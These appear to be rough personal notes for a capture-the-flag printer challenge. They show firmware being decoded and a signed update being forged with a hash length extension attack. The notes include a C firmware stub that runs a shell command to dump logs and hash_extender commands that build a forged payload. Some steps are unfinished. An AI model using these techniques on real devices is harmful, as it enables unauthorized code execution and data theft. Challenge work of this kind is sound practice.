# Break the Printer

[Printer Here](https://printer.kringlecastle.com/)

# Firmware
Download the current firmware from [here](https://printer.kringlecastle.com/firmware).

The downloaded json contains a base64 string that when decoded gives you a binary.

```bash
echo 'ENCODED STRING' | base64 -d > decode.bin
file decode.bin # zip archive
unzip decode.bin # gives you firmware.bin
```
Stuck at this point, need a linux box to run the executable (or I could use a docker image, but I'm lazy). Good use of WSL when I get my PC back up.

# Use the `strace, ltrace` Terminal
Go to santa's kitchen. Copy the binary over by:
## Local
```bash
xxd firmware.bin > firmware.hex
# copy firmware.hex content clipboard
```

## Terminal
```bash
vim firmware.hex
# paste contents
xxd -f firmware.hex firmware.bin
```

The firmware writes the string `"Firmware is fully up to date!\n"`. Need to figure out how to `cat` the log file so it appears on the printer web page.

# New Firmware
```c
#include <stdio.h>
#include <stdlib.h>

int main (void) {
   return system("cat /var/log");
}
```

start: 0000330

```bash
readelf
# Docker Shell
```bash
docker build -t bolden/debian:1.0 .
docker run --rm -v "tmp:/tmp" -ti bolden/debian:1.0 /bin/bash
```

# Hash Extension
https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks

# References
https://reverseengineering.stackexchange.com/questions/21910/elf-x86-64-adding-function
http://www.skyfree.org/linux/references/ELF_Format.pdf

ln -s /usr/local/opt/openssl/lib /usr/local/lib/   

./hash_extender/hash_extender --data "`cat ./current.zip`" --secret 16 --append "`cat ./exploit.zip`" --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --format sha256 --out-data-format hex

```bash
./hash_extender/hash_extender --data-format hex --data "`cat ./current.zip | xxd -p -c 99999`" --secret 16 --append-format hex --append $(cat ./exploit.zip | xxd -p -c 99999) --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --format sha256 --out-data-format hex | xxd -r -p | base64 -o payload.base64
```

original
 json > base64 string > zip archive > elf binary

